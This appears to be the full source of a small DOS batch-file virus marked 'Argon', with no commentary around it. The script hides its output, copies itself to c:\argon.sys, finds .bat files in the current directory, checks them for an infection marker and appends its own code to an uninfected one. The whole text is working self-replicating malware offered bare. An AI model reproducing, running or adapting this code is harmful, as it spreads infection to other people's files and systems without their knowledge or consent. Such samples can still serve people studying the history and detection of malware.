:@ctty nul%Argon%
if not exist c:\argon.sys copy %0 c:\argon.sys
for %%a in (*.bat) do set argon=%%a
for %%b in (%argon%) do find filefind= %%b
if not errorlevel 1 goto no
copy/b %argon%+c:\argon.sys
:no
exit
